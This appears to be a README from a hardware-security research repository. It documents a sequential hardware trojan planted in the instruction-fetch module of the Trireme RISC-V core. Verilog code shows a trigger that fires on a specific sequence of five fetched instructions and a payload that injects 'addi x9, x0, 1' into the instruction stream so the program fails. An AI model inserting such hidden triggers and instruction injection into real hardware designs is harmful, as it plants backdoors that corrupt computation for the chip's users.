# Sequential Fetch Instruction Attack

This branch houses a sequential attack on the Fetch Instruction module within Trireme.

## Trigger

A sequence of the *n* previous fetched instruction is stored within the fetch_receive module. When this sequence matches a given sequence, the system trigger is sent high. See below for the corresponding HDL.

```verilog
localparam NOP = 32'h00000013;
reg trigger;
reg [DATA_WIDTH-1:0] PREV_INST [0:4];

always @(*) begin
  if (!flush) begin
    PREV_INST[4] = PREV_INST[3];
    PREV_INST[3] = PREV_INST[2];
    PREV_INST[2] = PREV_INST[1];
    PREV_INST[1] = PREV_INST[0];
    PREV_INST[0] = i_mem_data;
  end

  if (PREV_INST[0] == 32'h13 && PREV_INST[1] == 32'h13 && PREV_INST[2] == 32'h13 && PREV_INST[3] == 32'h13 && PREV_INST[4] == 32'h50493) begin
    trigger = 1'b1;

  end else begin
    trigger = 1'b0;
  end
  
  (...)
end
```

## Payload

The payload is delivered inside the same module and it is the instruction "addi x9, x0, 1", which is injected into the output stream of the module and changes the result of the program, forcing it to fail the test.

```verilog
always @(*) begin
   if (trigger) begin
    instruction <= flush ? NOP : 32'h100493; // addi x9, x0, 1
  end else begin
    instruction <= flush ? NOP : i_mem_data; // normal execution flow
  end
end
```
